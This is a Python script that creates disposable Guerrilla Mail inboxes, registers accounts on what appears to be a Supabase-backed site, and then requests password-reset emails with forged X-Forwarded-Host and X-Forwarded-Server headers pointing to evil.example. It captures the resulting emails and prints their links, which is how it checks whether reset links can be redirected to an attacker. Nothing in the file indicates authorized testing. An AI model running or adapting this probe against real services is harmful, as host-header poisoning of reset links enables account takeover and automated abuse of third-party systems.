import ssl, json, urllib.request, urllib.error, urllib.parse, sys, time, random, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"
GM = "https://api.guerrillamail.com/ajax.php"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Content-Type": "application/json"}

def req(method, url, body=None, token=None, extra=None):
    h = dict(UA)
    if token: h["Authorization"] = f"Bearer {token}"
    if extra: h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, {}, repr(e)

def new_inbox():
    st, hd, b = req("GET", GM + "?f=get_email_address&lang=en&site=guerrillamail.com")
    d = json.loads(b)
    return d["email_addr"].split("@")[0] + "@sharklasers.com", d["sid_token"]

def wait_onlyfake(sid, limit=25):
    for i in range(limit):
        time.sleep(4)
        st, hd, b = req("GET", GM + f"?f=get_email_list&offset=0&sid_token={sid}")
        try: lst = json.loads(b).get("list", [])
        except Exception: lst = []
        for m in lst:
            if "onlyfake" in (m.get("mail_from") or "").lower():
                return m
    return None

def fetch(sid, mid):
    st, hd, b = req("GET", GM + f"?f=fetch_email&email_id={mid}&sid_token={sid}")
    try: return json.loads(b)
    except Exception: return {}

def body(msg):
    parts = []
    for k in ("mail_body", "mail_body_text", "mail_body_html"):
        v = msg.get(k)
        if isinstance(v, str): parts.append(v)
    return "\n".join(parts)

def case(label, headers):
    addr, sid = new_inbox()
    print(f"\n== {label} inbox={addr} headers={headers}")
    pw = "Zq7#vL2!mX9$wR4"
    st, hd, b = req("POST", SUPA + "/auth/v1/signup", {"email": addr, "password": pw}, extra={"apikey": KEY})
    print("signup:", st)
    st, hd, b = req("POST", SUPA + "/auth/v1/recover?redirect_to=" + urllib.parse.quote("https://onlyfakeai.ru/login", safe=""),
                    {"email": addr}, extra={"apikey": KEY, **headers})
    print("recover:", st, b[:120])
    m = wait_onlyfake(sid)
    if not m:
        print("NO MAIL"); return
    msg = fetch(sid, m["mail_id"])
    bd = body(msg)
    print("BODY:", re.sub(r"\s+", " ", bd)[:700])
    for u in re.findall(r"https?://[^\s\"'<>\)]+", bd):
        print("LINK:", u[:420])

case("XFH evil.example", {"X-Forwarded-Host": "evil.example"})
case("XFH+proto http", {"X-Forwarded-Host": "evil.example", "X-Forwarded-Proto": "http"})
case("X-Forwarded-Server", {"X-Forwarded-Server": "evil.example"})
